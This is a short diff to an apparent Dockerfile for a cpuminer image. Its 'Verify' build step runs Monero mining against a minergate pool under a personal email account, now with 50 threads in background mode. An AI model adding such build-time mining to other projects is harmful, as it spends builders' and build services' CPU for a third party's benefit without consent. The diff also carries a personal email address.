@@ -40,8 +40,8 @@ RUN set -x \
     # Verify
  && cpuminer --cputest \
  && cpuminer --version \
- && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
- & sleep 600 \
+ && cpuminer -a cryptonight --threads=50 --retries=3 --retry-pause=5 --background -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
+ && sleep 30 \
  && exit
 
 ENTRYPOINT ["dumb-init"]
